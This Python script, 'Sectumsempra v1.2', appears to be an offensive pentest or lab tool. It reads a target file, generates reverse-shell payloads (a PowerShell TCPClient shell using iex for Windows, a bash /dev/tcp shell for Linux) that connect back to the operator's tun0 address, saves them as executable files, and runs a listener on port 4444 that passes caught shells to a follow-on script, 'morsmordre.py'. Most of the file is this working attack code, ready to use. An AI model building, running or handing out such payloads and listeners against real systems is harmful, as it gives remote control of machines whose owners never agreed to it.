#!/usr/bin/env python3
"""
Sectumsempra v1.2 - Green Engine
Async Socket Listener with Proper Morsmordre Handoff
"""

import asyncio
import argparse
import json
import os
import sys
import subprocess
import socket
from pathlib import Path
from typing import Optional, Dict, Any
import time

try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

class Sectumsempra:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.lhost: Optional[str] = None
        self.lport: int = 4444
        self.target_os: str = "Linux"
        self.target_ip: str = ""
        self.contract_file: Optional[str] = None
        self.morsmordre_proc = None
        
    def banner(self):
        if self.console:
            self.console.print(Panel.fit(
                "[bold green]Sectumsempra v1.2 - Green Engine[/bold green]",
                subtitle="[green]The Bridge Protocol[/green]",
                border_style="green"
            ))
        else:
            print("\033[92m>>> Sectumsempra v1.2 - Green Engine <<<\033[0m")
    
    def status(self, msg: str, level: str = "info"):
        ts = time.strftime("%H:%M:%S")
        indicators = {
            "info": "[*]", "success": "[+]", "warning": "[!]", 
            "error": "[-]", "handoff": "[»]", "shell": "[SHELL]"
        }
        ind = indicators.get(level, "[*]")
        
        if self.console:
            color = {"info": "blue", "success": "green", "warning": "yellow", 
                    "error": "red", "handoff": "magenta", "shell": "red"}.get(level, "white")
            self.console.print(f"[{color}]{ind} [{ts}] {msg}[/{color}]")
        else:
            colors = {"info": "\033[94m", "success": "\033[92m", 
                     "warning": "\033[93m", "error": "\033[91m", 
                     "handoff": "\033[95m", "shell": "\033[91m"}
            print(f"{colors.get(level, '')}{ind} [{ts}] {msg}\033[0m")
    
    def find_tun0(self) -> str:
        try:
            import netifaces
            if 'tun0' in netifaces.interfaces():
                addrs = netifaces.ifaddresses('tun0')
                if netifaces.AF_INET in addrs:
                    return addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
        
        try:
            result = subprocess.run(
                ["ip", "addr", "show", "tun0"], 
                capture_output=True, text=True
            )
            import re
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        
        return "0.0.0.0"
    
    def load_contract(self, filename: Optional[str] = None) -> Dict:
        if filename:
            self.contract_file = filename
        else:
            files = sorted(Path('.').glob('netweave_*.json'))
            if not files:
                self.status("No contract found", "error")
                sys.exit(1)
            self.contract_file = str(files[-1])
        
        with open(self.contract_file) as f:
            data = json.load(f)
        
        self.target_ip = data.get('target', '')
        self.target_os = data.get('operating_system', 'Linux')
        self.lport = 4444  # Could be configurable
        
        self.status(f"Contract: {self.contract_file}", "success")
        self.status(f"Target: {self.target_ip} | OS: {self.target_os}", "info")
        return data
    
    def generate_payload(self) -> str:
        self.lhost = self.find_tun0()
        self.status(f"LHOST: {self.lhost}", "success")
        
        if "Windows" in self.target_os:
            payload = f"""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""""
            filename = f"payload_windows_{self.target_ip.replace('.', '_')}.ps1"
            display = f"powershell -ExecutionPolicy Bypass -File {filename}"
        else:
            # Linux bash
            payload = f"""bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"""
            filename = f"payload_linux_{self.target_ip.replace('.', '_')}.sh"
            display = f"bash {filename}"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        self.status(f"Payload: {filename}", "success")
        self.status(f"Execute on target: {display}", "info")
        return filename
    
    async def bridge_to_morsmordre(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Bridge the socket to Morsmordre subprocess"""
        addr = writer.get_extra_info('peername')
        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
        
        # Set environment for Morsmordre
        env = os.environ.copy()
        env['MORSMORDRE_TARGET'] = self.target_ip
        env['MORSMORDRE_OS'] = self.target_os
        env['MORSMORDRE_LHOST'] = self.lhost
        env['MORSMORDRE_LPORT'] = str(self.lport)
        
        self.status("Handing off to Morsmordre...", "handoff")
        
        # Create Morsmordre process with stdin/stdout connected to our socket
        proc = await asyncio.create_subprocess_exec(
            sys.executable, 'morsmordre.py',
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env
        )
        
        # Create tasks to bridge data between socket and process
        async def socket_to_proc():
            """Read from socket, write to Morsmordre stdin"""
            try:
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    proc.stdin.write(data)
                    await proc.stdin.drain()
            except asyncio.CancelledError:
                pass
            except Exception as e:
                self.status(f"Socket bridge error: {e}", "error")
        
        async def proc_to_socket():
            """Read from Morsmordre stdout, write to socket"""
            try:
                while True:
                    data = await proc.stdout.read(4096)
                    if not data:
                        break
                    writer.write(data)
                    await writer.drain()
            except asyncio.CancelledError:
                pass
            except Exception as e:
                self.status(f"Proc bridge error: {e}", "error")
        
        # Run both directions concurrently
        try:
            await asyncio.gather(
                socket_to_proc(),
                proc_to_socket()
            )
        except Exception as e:
            self.status(f"Bridge failed: {e}", "error")
        finally:
            proc.terminate()
            writer.close()
            await writer.wait_closed()
            self.status("Session closed", "warning")
    
    async def start_listener(self):
        server = await asyncio.start_server(
            self.bridge_to_morsmordre, '0.0.0.0', self.lport
        )
        
        self.status(f"Listener: 0.0.0.0:{self.lport}", "success")
        self.status("Waiting for shell...", "info")
        
        async with server:
            await server.serve_forever()
    
    def run(self, contract_file: Optional[str] = None):
        self.banner()
        self.load_contract(contract_file)
        self.generate_payload()
        
        try:
            asyncio.run(self.start_listener())
        except KeyboardInterrupt:
            self.status("Terminated", "warning")

def main():
    parser = argparse.ArgumentParser(description='Sectumsempra v1.2 - The Bridge')
    parser.add_argument('--contract', help='NetWeave JSON contract')
    args = parser.parse_args()
    
    Sectumsempra().run(args.contract)

if __name__ == "__main__":
    main()
